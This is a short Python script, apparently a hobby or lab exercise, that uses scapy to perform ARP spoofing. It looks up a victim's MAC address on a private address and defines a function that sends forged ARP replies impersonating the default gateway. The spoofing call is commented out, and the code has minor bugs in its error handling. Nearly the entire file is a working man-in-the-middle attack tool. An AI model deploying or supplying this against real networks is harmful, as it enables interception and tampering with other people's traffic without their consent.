import scapy.all as scapy

victim = "192.168.56.101" #input("Enter victim IP address: ")
gw = scapy.conf.route.route("0.0.0.0")[2]

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print(f'[!] No response received for {ip}. Check network connectivity and permissions!')
        return None

def spoof(victim_ip, gateway_ip):
    target_mac = get_mac(victim_ip)
    if target_mac is None:
        print(f'[!] Could not get MAC address for {victim_ip}. Exiting...')
        
    packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=target_mac, psrc=gateway_ip)
    scapy.send(packet, verbose=False)
    
    print(f"MAC Address of {victim}: {mac_address}")
    print(f'[+] ARP response sent to {victim_ip}, spoofing {gateway_ip}')

#spoof(victim, gw)
mac_address = get_mac(victim)
if mac_address:
    print(f"MAC Address of {victim}: {mac_address}")
print(f"Default Gateway: {gw}")
